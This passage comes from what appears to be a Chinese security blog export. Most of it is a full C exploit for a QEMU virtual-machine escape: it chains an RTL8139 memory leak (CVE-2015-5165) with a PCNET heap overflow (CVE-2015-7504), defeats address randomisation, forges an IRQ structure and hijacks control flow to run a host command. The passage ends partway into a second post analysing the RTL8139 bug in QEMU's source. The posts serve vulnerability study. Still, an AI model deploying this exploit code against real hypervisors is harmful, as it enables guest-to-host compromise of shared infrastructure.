- 1)// Ethernet Frame 大小// DST(6) + SRC(6) + Length/Type(2) + PayloadMTU(1500)#define RTL8139_BUFFER_SIZE 1514// RTL8139 网卡 PMIO 地址#define RTL8139_PORT 0xc000// Rx ownership flag#define CP_RX_OWN (1&lt;&lt;31)// w0 end of ring flag#define CP_RX_EOR (1&lt;&lt;30)// Rx buffer size mask 表示 0 ~ 12 位为 buffer size#define CP_RX_BUFFER_SIZE_MASK ((1&lt;&lt;13) - 1)// Tx ownership flag#define CP_TX_OWN (1&lt;&lt;31)// Tx end of ring flag#define CP_TX_EOR (1&lt;&lt;30)// last segment of received packet flag#define CP_TX_LS (1&lt;&lt;28)// large send packet flag#define CP_TX_LGSEN (1&lt;&lt;27)// IP checksum offload flag#define CP_TX_IPCS (1&lt;&lt;18)// TCP checksum offload flag#define CP_TX_TCPCS (1&lt;&lt;16)#define PAGE_SHIFT 12#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)#define PFN_PRESENT (1ull &lt;&lt; 63)#define PFN_PFN ((1ull &lt;&lt; 55) - 1)#define page_aligned __attribute__((aligned(PAGE_SIZE)))#define PCNET_BUFFER_SIZE 4096#define PCNET_PORT 0xc100#define DRX 0x0001#define DTX 0x0002#define LOOP 0x0004#define DXMTFCS 0x0008#define INTL 0x0040#define DRCVPA 0x2000#define DRCVBC 0x4000#define PROM 0x8000#define CRC(crc, ch) (crc = (crc &gt;&gt; 8) ^ crctab[(crc ^ (ch)) &amp; 0xff])// RTL8139 网卡寄存器偏移地址enum RTL8139_registers &#123; TxAddr0 = 0x20, // Tx descriptor address ChipCmd = 0x37, TxConfig = 0x40, RxConfig = 0x44, TxPoll = 0xD9, // tell chip to check Tx descriptors for work CpCmd = 0xE0, // C+ Command register (C+ mode only) // 虽然名字写的 RxRingAddr, 但实际上是 Rx descriptor address RxRingAddrLO = 0xE4, // 32-bit low addr of Rx descriptor RxRingAddrHI = 0xE8, // 32-bit high addr of Rx descriptor&#125;;enum RTL_8139_tx_config_bits &#123; TxLoopBack = (1 &lt;&lt; 18) | (1 &lt;&lt; 17), // enable loopback test mode&#125;;enum RTL_8139_rx_mode_bits &#123; AcceptErr = 0x20, AcceptRunt = 0x10, AcceptBroadcast = 0x08, AcceptMulticast = 0x04, AcceptMyPhys = 0x02, AcceptAllPhys = 0x01,&#125;;enum RTL_8139_CplusCmdBits &#123; CPlusRxVLAN = 0x0040, /* enable receive VLAN detagging */ CPlusRxChkSum = 0x0020, /* enable receive checksum offloading */ CPlusRxEnb = 0x0002, CPlusTxEnb = 0x0001,&#125;;enum RT8139_ChipCmdBits &#123; CmdReset = 0x10, CmdRxEnb = 0x08, CmdTxEnb = 0x04, RxBufEmpty = 0x01,&#125;;enum RTL8139_TxPollBits &#123; CPlus = (0x1 &lt;&lt; 6),&#125;;// RTL8139 Rx / Tx descriptortypedef struct rtl8139_desc &#123; uint32_t dw0; uint32_t dw1; uint32_t buf_lo; uint32_t buf_hi;&#125;rtl8139_desc;// RTL8139 Rx / Tx ringtypedef struct rtl8139_ring &#123; struct rtl8139_desc* desc; void* buffer;&#125;rtl8139_ring;uint8_t rtl8139_packet[] = &#123; // Ethernet Frame Header 数据 0x52, 0x54, 0x00, 0x12, 0x34, 0x56, // DST MAC 52:54:00:12:34:56 0x52, 0x54, 0x00, 0x12, 0x34, 0x56, // SRC MAC 52:54:00:12:34:56 0x08, 0x00, // Length / Type: IPv4 // Ethernet Frame Payload 数据, 即 IPv4 数据包 // Version &amp; IHL(Internet Header Length) (0x04 &lt;&lt; 4) | 0x05, // 4bits version = 0x4x | 4bits hlen =0xx5 =&gt; 0x05 * 4 = 20 bytes 0x00, // 8bit TOS 0x00, 0x13, // 16bits Total Length = 0x13 = 19 bytes,19-20 = -1 = 0xFFFF, trigger vulnerability 0xde, 0xad, // 16bits Identification 0x40, 0x00, // 3bits Flags &amp; 13bits Fragment Offset 0x40, // 8bits TTL 0x06, // 8bits Protocol:TCP 0xde, 0xad, // 16bits Header checksum 0x7f, 0x00, 0x00, 0x01, // 32bits Source IP:127.0.0.1 0x7f, 0x00, 0x00, 0x01, // 32bits Destination IP:127.0.0.1 // IP Packet Payload 数据, 即 TCP 数据包 0xde, 0xad, // 16bits Source Port 0xbe, 0xef, // 16bits Destination Port 0x00, 0x00, 0x00, 0x00, // 32bits Sequence Number 0x00, 0x00, 0x00, 0x00, // 32bits Acknowledgement Number 0x50, // 01010000, 4bits Header Length = 5*4 = 20 &amp;&amp; 4bits null 0x10, // 00010000, 2bits null &amp;&amp; 2bits URG ACK PSH RST SYN FIN 0xde, 0xad, // 16bits Window Size 0xde, 0xad, // 16bits TCP checksum 0x00, 0x00 // 16bits Urgent Pointer&#125;;uint64_t get_physical_pfn(void* addr) &#123; uint64_t pfn = -1; FILE* fp = fopen("/proc/self/pagemap","rb"); if (!fp) &#123; return pfn; &#125; if (!fseek(fp,(unsigned long)addr/PAGE_SIZE*8,SEEK_SET)) &#123; fread(&amp;pfn,sizeof(pfn),1,fp); if (pfn &amp; PFN_PRESENT) &#123; pfn &amp;= PFN_PFN; &#125; &#125; fclose(fp); return pfn;&#125;uint64_t gva_to_gpa(void* addr) &#123; uint64_t pfn = get_physical_pfn(addr); return pfn * PAGE_SIZE + (uint64_t)addr % PAGE_SIZE;&#125;void rtl8139_desc_config_rx(rtl8139_ring* ring, rtl8139_desc* desc, size_t nb) &#123; size_t buffer_size = RTL8139_BUFFER_SIZE+4; for (size_t i = 0; i &lt; nb; ++i) &#123; memset(&amp;desc[i],0,sizeof(desc[i])); ring[i].desc = &amp;desc[i]; ring[i].buffer = aligned_alloc(PAGE_SIZE, buffer_size); memset(ring[i].buffer,0,buffer_size); // descriptor owned by NIC 准备接收数据 ring[i].desc-&gt;dw0 |= CP_RX_OWN; if (i == nb-1) &#123; ring[i].desc-&gt;dw0 |= CP_RX_EOR; // End of Ring &#125; ring[i].desc-&gt;dw0 &amp;= ~CP_RX_BUFFER_SIZE_MASK; ring[i].desc-&gt;dw0 |= buffer_size; // buffer_size ring[i].desc-&gt;buf_lo = (uint32_t)gva_to_gpa(ring[i].buffer); &#125; // Rx descriptors address outl((uint32_t)gva_to_gpa(desc),RTL8139_PORT+RxRingAddrLO); outl(0,RTL8139_PORT+RxRingAddrHI);&#125;void rtl8139_desc_config_tx(rtl8139_desc* desc, void* buffer) &#123; memset(desc, 0, sizeof(rtl8139_desc)); desc-&gt;dw0 |= CP_TX_OWN | // descriptor owned by NIC 准备发送数据 CP_TX_EOR | CP_TX_LS | CP_TX_LGSEN | CP_TX_IPCS | CP_TX_TCPCS; desc-&gt;dw0 += RTL8139_BUFFER_SIZE; desc-&gt;buf_lo = (uint32_t)gva_to_gpa(buffer); outl((uint32_t)gva_to_gpa(desc),RTL8139_PORT+TxAddr0); outl(0,RTL8139_PORT+TxAddr0+4);&#125;void rtl8139_card_config() &#123; // 触发漏洞需要设置的一些参数 outl(TxLoopBack,RTL8139_PORT+TxConfig); outl(AcceptMyPhys,RTL8139_PORT+RxConfig); outw(CPlusRxEnb|CPlusTxEnb,RTL8139_PORT+CpCmd); outb(CmdRxEnb|CmdTxEnb,RTL8139_PORT+ChipCmd);&#125;void rtl8139_packet_send(void* buffer, void* packet, size_t len) &#123; if (len &lt;= RTL8139_BUFFER_SIZE) &#123; memcpy(buffer,packet,len); outb(CPlus,RTL8139_PORT+TxPoll); &#125;&#125;void xxd(uint8_t* ptr, size_t size) &#123; for (size_t i = 0, j = 0; i &lt; size; ++i, ++j) &#123; if (i % 16 == 0) &#123; j = 0; printf("\n%p: ",ptr + i); &#125; printf("%02x ", ptr[i]); if (j == 7) &#123; printf("- "); &#125; &#125; printf("\n");&#125;uint64_t qemu_search_text_base(void* ptr, size_t size)&#123; size_t i,j; uint64_t property_get_bool_offset = 0x369597; uint64_t property_get_str_offset = 0x369340; uint64_t memory_region_destructor_none_offset = 0xed560; uint64_t address_space_io_offset = 0x8e5e80; uint64_t offset[]=&#123;property_get_bool_offset, property_get_str_offset, memory_region_destructor_none_offset,address_space_io_offset&#125;; uint64_t *int_ptr, addr, text_base =0; for (i=0; i&lt;size-8; i+=8) &#123; int_ptr = (uint64_t*)(ptr+i); addr = *int_ptr; for(j=0; j&lt;sizeof(offset)/sizeof(uint64_t); j++) &#123; if( ((addr &amp; 0xfffff00000000000) == 0x500000000000) &amp;&amp; (( (addr - offset[j]) &amp; 0xfff ) == 0) ) &#123; text_base = addr - offset[j]; //printf("[+]text_base_ptr: %p\n",int_ptr); break; &#125; if(text_base !=0) break; &#125; &#125; return text_base;&#125;uint64_t qemu_search_phy_base(void *ptr, size_t size)&#123; size_t i; uint64_t *int_ptr, addr, phy_base = 0; for (i = 0; i &lt; size-8; i += 8) &#123; int_ptr = (uint64_t*)(ptr+i); addr = *int_ptr; if((addr &amp; 0xfffff00000000000) == 0x700000000000) &#123; addr = addr &amp; 0xffffffffff000000; phy_base = addr - 0x80000000; //printf("[+]phy_base_ptr: %p\n",int_ptr); break; &#125; &#125; return phy_base;&#125;uint64_t qemu_search_heap_base(void *ptr, size_t size, uint64_t text_base)&#123; size_t i; size_t j; uint64_t *int_ptr, addr, heap_base = 0; uint64_t offset[] = &#123;0xbb9e0,0xe20ce8,0x10be948,0xa6088,0xe904d8&#125;; //&#123;0x4a7c0, 0x1470208, 0x1765d70, 0xd3c748, 0xe883b8, 0x1470208&#125;; for (i = 0; i &lt; size-8; i += 8) &#123; int_ptr = (uint64_t*)(ptr+i); addr = *int_ptr; //printf("i: %d 0x%lx\n",i, addr); for(j=0; j&lt;sizeof(offset)/sizeof(uint64_t); j++) &#123; if(((addr-text_base) &gt; 0xd55000) &amp;&amp; ((addr &amp; 0xffff00000000)==(text_base &amp; 0xffff00000000)) &amp;&amp; ((addr - offset[j]) &amp; 0xfff ) == 0) &#123; heap_base = addr - offset[j]; break; &#125; if(heap_base != 0) break; &#125; &#125; return heap_base;&#125;enum PCNET_registers &#123; RDP = 0x10, RAP = 0x12, RST = 0x14,&#125;;struct pcnet_config &#123; uint16_t mode; uint8_t rlen; uint8_t tlen; uint8_t mac[6]; uint16_t _reserved; uint8_t ladr[8]; uint32_t rx_desc; uint32_t tx_desc;&#125;;struct pcnet_desc &#123; uint32_t addr; int16_t length; int8_t status_1; int8_t status_2; uint32_t misc; uint32_t _reserved;&#125;;static uint8_t pcnet_packet[PCNET_BUFFER_SIZE] = &#123; 0x52, 0x54, 0x00, 0x12, 0x34, 0x56, 0x52, 0x54, 0x00, 0x12, 0x34, 0x56, 0x08, 0x00,&#125;;/* generated using the AUTODIN II polynomial * x^32 + x^26 + x^23 + x^22 + x^16 + * x^12 + x^11 + x^10 + x^8 + x^7 + x^5 + x^4 + x^2 + x^1 + 1 */static const uint32_t crctab[256] = &#123; 0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f, 0xe963a535, 0x9e6495a3, 0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988, 0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91, 0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de, 0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7, 0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9, 0xfa0f3d63, 0x8d080df5, 0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172, 0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b, 0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940, 0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59, 0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423, 0xcfba9599, 0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924, 0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d, 0x76dc4190, 0x01db7106, 0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433, 0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01, 0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e, 0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950, 0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65, 0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0, 0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa, 0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f, 0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a, 0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683, 0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1, 0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb, 0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc, 0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5, 0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b, 0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55, 0x316e8eef, 0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236, 0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe, 0xb2bd0b28, 0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d, 0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713, 0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38, 0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242, 0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777, 0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45, 0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2, 0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc, 0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9, 0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693, 0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94, 0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d,&#125;;static int fd = -1;/* PCNET primitives */void pcnet_packet_patch_crc(uint8_t *packet, uint32_t current, uint32_t target)&#123; size_t i = 0, j; uint8_t *ptr; uint32_t workspace[2] = &#123; current, target &#125;; for (i = 0; i &lt; 2; i++) workspace[i] &amp;= (uint32_t)~0; ptr = (uint8_t *)(workspace + 1); for (i = 0; i &lt; 4; i++) &#123; j = 0; while(crctab[j] &gt;&gt; 24 != *(ptr + 3 - i)) j++; *((uint32_t *)(ptr - i)) ^= crctab[j]; *(ptr - i - 1) ^= j; &#125; strncpy(packet, ptr - 4, 4);&#125;uint64_t pcnet_card_config(struct pcnet_config *config, struct pcnet_desc *rx_desc, struct pcnet_desc *tx_desc)&#123; memset(config, 0, sizeof(struct pcnet_config)); config-&gt;mode = LOOP | PROM; strcpy(config-&gt;mac, "\xaa\xbb\xcc\xdd\xee\xff"); config-&gt;rlen = 0x0; config-&gt;tlen = 0x0; config-&gt;rx_desc = (uint32_t)gva_to_gpa(rx_desc); config-&gt;tx_desc = (uint32_t)gva_to_gpa(tx_desc); return gva_to_gpa(config);&#125;void pcnet_desc_config(struct pcnet_desc *desc, void *buffer, int is_rx)&#123; uint16_t bcnt = -PCNET_BUFFER_SIZE; bcnt &amp;= 0xfff; bcnt |= 0xf000; memset(desc, 0, sizeof(struct pcnet_desc)); memset(buffer, 0, PCNET_BUFFER_SIZE); desc-&gt;addr = (uint32_t)gva_to_gpa(buffer); desc-&gt;length = bcnt; if (is_rx) &#123; /* receive buffers owned by the card */ desc-&gt;status_2 = 0x80; &#125;&#125;void pcnet_packet_send(struct pcnet_desc *desc, void *buffer, void *packet, size_t len)&#123; if (len &lt;= PCNET_BUFFER_SIZE) &#123; memcpy(buffer, packet, len); /* set STP ENP ADDFCS bits */ desc-&gt;status_2 |= 0x23; len = (-len); len &amp;= 0xfff; len |= 0xf000; desc-&gt;length = len; /* flip ownership to card */ desc-&gt;status_2 |= 0x80; /* signal packet */ outw(0, PCNET_PORT + RAP); outw(0x8, PCNET_PORT + RDP); &#125;&#125;int main()&#123; /* first part is info leaking, go to cve-2015-5165.c to get more details */ struct rtl8139_ring *rtl8139_rx_ring; struct rtl8139_desc *rtl8139_rx_desc, rtl8139_tx_desc; void *rtl8139_tx_buffer; uint32_t rtl8139_rx_nb = 44; uint32_t i; fd = open("/proc/self/pagemap", O_RDONLY); if (fd &lt; 0) &#123; puts("open pagemap failed!"); exit(0); &#125; rtl8139_rx_ring = (struct rtl8139_ring*)calloc(rtl8139_rx_nb, sizeof(struct rtl8139_ring)); rtl8139_rx_desc = (struct rtl8139_desc* )aligned_alloc(PAGE_SIZE, sizeof(struct rtl8139_desc) * rtl8139_rx_nb); rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE); iopl(3); rtl8139_card_config(); rtl8139_desc_config_tx(&amp;rtl8139_tx_desc, rtl8139_tx_buffer); rtl8139_desc_config_rx(rtl8139_rx_ring, rtl8139_rx_desc, rtl8139_rx_nb); rtl8139_packet_send(rtl8139_tx_buffer, rtl8139_packet, sizeof(rtl8139_packet)); sleep(2); /* dump packet content in xxd style */ //for (i = 0; i &lt; rtl8139_rx_nb; i++) // xxd(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE); uint64_t text_base, phy_base, heap_base; for (i=0; i&lt;rtl8139_rx_nb; i++) &#123; text_base = qemu_search_text_base(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE); if (text_base != 0) break; &#125; if (text_base == 0)&#123; puts("text base not found\n"); exit(0); &#125; printf("[+]text base found: 0x%lx\n", text_base); for (i=0; i&lt;rtl8139_rx_nb; i++) &#123; phy_base = qemu_search_phy_base(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE); if (phy_base != 0) break; &#125; if (phy_base == 0)&#123; puts("phy base not found\n"); exit(0); &#125; printf("[+]physical base found: 0x%lx\n", phy_base); for (i=0; i&lt;rtl8139_rx_nb; i++) &#123; heap_base = qemu_search_heap_base(rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE, text_base); if (heap_base != 0) break; &#125; if (heap_base == 0)&#123; puts("heap base not found\n"); exit(0); &#125; printf("[+]heap base found: 0x%lx\n", heap_base); /* second part is about hajacking the control flow */ struct pcnet_config pcnet_config; uint32_t pcnet_config_mem; struct pcnet_desc pcnet_tx_desc page_aligned; struct pcnet_desc pcnet_rx_desc page_aligned; void *pcnet_rx_buffer, *pcnet_tx_buffer; uint32_t fcs = ~0; uint16_t lo, hi; uint64_t system_plt = text_base + 0x9b858; uint64_t pcnet_buffer_addr = heap_base + (0x561999c43a10-0x561999a55000); //0x17ba310 0x1eea10 printf("[+]system_plt = %p\n",system_plt); printf("[+]pcnet_buffer_addr = %p\n",pcnet_buffer_addr); getchar(); uint64_t *ptr; uint8_t *c_ptr; /* build the fake irq in pcnet_packet +0x10 */ ptr = (uint64_t *)(pcnet_packet + 0x10); *ptr = system_plt; *(ptr+1) = pcnet_buffer_addr+0x20; *(ptr+2) = 0x61632d656d6f6e67; *(ptr+3) = 0x726f74616c75636c; pcnet_rx_buffer = (uint64_t *)aligned_alloc(PAGE_SIZE, PCNET_BUFFER_SIZE); pcnet_tx_buffer = (uint64_t *)aligned_alloc(PAGE_SIZE, PCNET_BUFFER_SIZE); /* setup rx */ pcnet_desc_config(&amp;pcnet_rx_desc, pcnet_rx_buffer, 1); /* setup tx */ pcnet_desc_config(&amp;pcnet_tx_desc, pcnet_tx_buffer, 0); /* setup pcnet config struct and get the physical address */ pcnet_config_mem = (uint32_t)pcnet_card_config(&amp;pcnet_config, &amp;pcnet_rx_desc, &amp;pcnet_tx_desc); lo = (uint16_t)pcnet_config_mem; hi = pcnet_config_mem &gt;&gt; 16; /* get the crc which value is fake_irq_addr */ uint32_t fake_irq_addr = (pcnet_buffer_addr+0x10-0x30) &amp; 0xffffffff; /* compute required crc */ c_ptr = pcnet_packet; while (c_ptr != &amp;pcnet_packet[PCNET_BUFFER_SIZE - 4]) CRC(fcs, *c_ptr++); pcnet_packet_patch_crc(c_ptr, fcs, htonl(fake_irq_addr)); /* soft reset */ inl(PCNET_PORT + 0x18); /* set swstyle */ outw(58, PCNET_PORT + RAP); outw(0x0102, PCNET_PORT + RDP); /* card config */ outw(1, PCNET_PORT + RAP); outw(lo, PCNET_PORT + RDP); outw(2, PCNET_PORT + RAP); outw(hi, PCNET_PORT + RDP); /* init and start */ outw(0, PCNET_PORT + RAP); outw(0x3, PCNET_PORT + RDP); sleep(2); // trigger the vuln and execute system("gnome-calculator") pcnet_packet_send(&amp;pcnet_tx_desc, pcnet_tx_buffer, pcnet_packet, PCNET_BUFFER_SIZE); return 0;&#125; 参考https://www.giantbranch.cn/2019/07/17/VM%20escape%20%E4%B9%8B%20QEMU%20Case%20Study/ https://kirin-say.top/2019/12/01/QEMU-Escape-Learning/#0x02-Set-Environment [https://ray-cp.github.io/archivers/qemu-pwn-cve-2015-7504%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90](]]></content>
      <categories>
        <category>CVE分析</category>
      </categories>
      <tags>
        <tag>Qemu</tag>
        <tag>CVE分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2015-5156调试分析]]></title>
    <url>%2F2020%2F05%2F10%2FCVE-2015-5165%2F</url>
    <content type="text"><![CDATA[CVE-2015-5165前置知识复现的第一个CVE，回过头来觉得还是要学习一下相关设备和协议的基础知识。 搭建环境编译qemu时遇到的一些问题及解决方案： https://blog.csdn.net/nancygreen/article/details/12261601 https://blog.51cto.com/mltyrone/1833903 对应版本的rtl8139.c源码：https://github.com/qemu/qemu/blob/bd80b5963f58c601f31d3186b89887bf8e182fb5/hw/net/rtl8139.c 内核镜像和qemu.img可以对照着这篇文章获取： http://jiayy.me/2019/04/15/CVE-2015-5165-7504/ 可以从此网站获取到各个版本的linux kernel源码，包括RC预览版本：https://github.com/torvalds/linux 此网站可用wget直接获取，但貌似无RC版本：https://cdn.kernel.org/pub/linux/kernel/ 漏洞分析出在rtl8139_cplus_transmit_one函数中，有个整数溢出的漏洞：原理我用自己画的一幅图配合代码感觉比较容易理解： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367static int rtl8139_cplus_transmit_one(RTL8139State *s)&#123; if (!rtl8139_transmitter_enabled(s)) &#123; DPRINTF("+++ C+ mode: transmitter disabled\n"); return 0; &#125; if (!rtl8139_cp_transmitter_enabled(s)) &#123; DPRINTF("+++ C+ mode: C+ transmitter disabled\n"); return 0 ; &#125; PCIDevice *d = PCI_DEVICE(s); int descriptor = s-&gt;currCPlusTxDesc; dma_addr_t cplus_tx_ring_desc = rtl8139_addr64(s-&gt;TxAddr[0], s-&gt;TxAddr[1]); /* Normal priority ring */ cplus_tx_ring_desc += 16 * descriptor; DPRINTF("+++ C+ mode reading TX descriptor %d from host memory at " "%08x %08x = 0x"DMA_ADDR_FMT"\n", descriptor, s-&gt;TxAddr[1], s-&gt;TxAddr[0], cplus_tx_ring_desc); uint32_t val, txdw0,txdw1,txbufLO,txbufHI; pci_dma_read(d, cplus_tx_ring_desc, (uint8_t *)&amp;val, 4); txdw0 = le32_to_cpu(val); pci_dma_read(d, cplus_tx_ring_desc+4, (uint8_t *)&amp;val, 4); txdw1 = le32_to_cpu(val); pci_dma_read(d, cplus_tx_ring_desc+8, (uint8_t *)&amp;val, 4); txbufLO = le32_to_cpu(val); pci_dma_read(d, cplus_tx_ring_desc+12, (uint8_t *)&amp;val, 4); txbufHI = le32_to_cpu(val); DPRINTF("+++ C+ mode TX descriptor %d %08x %08x %08x %08x\n", descriptor, txdw0, txdw1, txbufLO, txbufHI);/* w0 ownership flag */#define CP_TX_OWN (1&lt;&lt;31)/* w0 end of ring flag */#define CP_TX_EOR (1&lt;&lt;30)/* first segment of received packet flag */#define CP_TX_FS (1&lt;&lt;29)/* last segment of received packet flag */#define CP_TX_LS (1&lt;&lt;28)/* large send packet flag */#define CP_TX_LGSEN (1&lt;&lt;27)/* large send MSS mask, bits 16...25 */#define CP_TC_LGSEN_MSS_MASK ((1 &lt;&lt; 12) - 1)/* IP checksum offload flag */#define CP_TX_IPCS (1&lt;&lt;18)/* UDP checksum offload flag */#define CP_TX_UDPCS (1&lt;&lt;17)/* TCP checksum offload flag */#define CP_TX_TCPCS (1&lt;&lt;16)/* w0 bits 0...15 : buffer size */#define CP_TX_BUFFER_SIZE (1&lt;&lt;16)#define CP_TX_BUFFER_SIZE_MASK (CP_TX_BUFFER_SIZE - 1)/* w1 add tag flag */#define CP_TX_TAGC (1&lt;&lt;17)/* w1 bits 0...15 : VLAN tag (big endian) */#define CP_TX_VLAN_TAG_MASK ((1&lt;&lt;16) - 1)/* w2 low 32bit of Rx buffer ptr *//* w3 high 32bit of Rx buffer ptr *//* set after transmission *//* FIFO underrun flag */#define CP_TX_STATUS_UNF (1&lt;&lt;25)/* transmit error summary flag, valid if set any of three below */#define CP_TX_STATUS_TES (1&lt;&lt;23)/* out-of-window collision flag */#define CP_TX_STATUS_OWC (1&lt;&lt;22)/* link failure flag */#define CP_TX_STATUS_LNKF (1&lt;&lt;21)/* excessive collisions flag */#define CP_TX_STATUS_EXC (1&lt;&lt;20) if (!(txdw0 &amp; CP_TX_OWN)) &#123; DPRINTF("C+ Tx mode : descriptor %d is owned by host\n", descriptor); return 0 ; &#125; DPRINTF("+++ C+ Tx mode : transmitting from descriptor %d\n", descriptor); if (txdw0 &amp; CP_TX_FS) &#123; DPRINTF("+++ C+ Tx mode : descriptor %d is first segment " "descriptor\n", descriptor); /* reset internal buffer offset */ s-&gt;cplus_txbuffer_offset = 0; &#125; int txsize = txdw0 &amp; CP_TX_BUFFER_SIZE_MASK; dma_addr_t tx_addr = rtl8139_addr64(txbufLO, txbufHI); /* make sure we have enough space to assemble the packet */ if (!s-&gt;cplus_txbuffer) &#123; s-&gt;cplus_txbuffer_len = CP_TX_BUFFER_SIZE; s-&gt;cplus_txbuffer = g_malloc(s-&gt;cplus_txbuffer_len); s-&gt;cplus_txbuffer_offset = 0; DPRINTF("+++ C+ mode transmission buffer allocated space %d\n", s-&gt;cplus_txbuffer_len); &#125; if (s-&gt;cplus_txbuffer_offset + txsize &gt;= s-&gt;cplus_txbuffer_len) &#123; /* The spec didn't tell the maximum size, stick to CP_TX_BUFFER_SIZE */ txsize = s-&gt;cplus_txbuffer_len - s-&gt;cplus_txbuffer_offset; DPRINTF("+++ C+ mode transmission buffer overrun, truncated descriptor" "length to %d\n", txsize); &#125; /* append more data to the packet */ DPRINTF("+++ C+ mode transmit reading %d bytes from host memory at " DMA_ADDR_FMT" to offset %d\n", txsize, tx_addr, s-&gt;cplus_txbuffer_offset); pci_dma_read(d, tx_addr, s-&gt;cplus_txbuffer + s-&gt;cplus_txbuffer_offset, txsize); s-&gt;cplus_txbuffer_offset += txsize; /* seek to next Rx descriptor */ if (txdw0 &amp; CP_TX_EOR) &#123; s-&gt;currCPlusTxDesc = 0; &#125; else &#123; ++s-&gt;currCPlusTxDesc; if (s-&gt;currCPlusTxDesc &gt;= 64) s-&gt;currCPlusTxDesc = 0; &#125; /* transfer ownership to target */ txdw0 &amp;= ~CP_RX_OWN; /* reset error indicator bits */ txdw0 &amp;= ~CP_TX_STATUS_UNF; txdw0 &amp;= ~CP_TX_STATUS_TES; txdw0 &amp;= ~CP_TX_STATUS_OWC; txdw0 &amp;= ~CP_TX_STATUS_LNKF; txdw0 